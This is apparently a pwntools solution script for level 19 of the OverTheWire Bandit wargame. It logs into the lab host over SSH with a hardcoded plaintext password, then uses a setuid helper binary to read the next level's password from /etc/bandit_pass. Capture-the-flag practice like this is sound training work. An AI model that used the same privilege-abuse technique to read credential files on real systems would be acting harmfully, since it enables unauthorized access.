from pwn import *

user = "bandit19"
password = "IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x"
host = "bandit.labs.overthewire.org"
port = 2220

shell = ssh(user, host, password=password, port=port)
sh = shell.run('sh')
sh.sendline("./bandit20-do cat /etc/bandit_pass/bandit20")
log.success("The Password for Bandit20 === " + sh.recvline().decode("utf-8"))
sh.close()

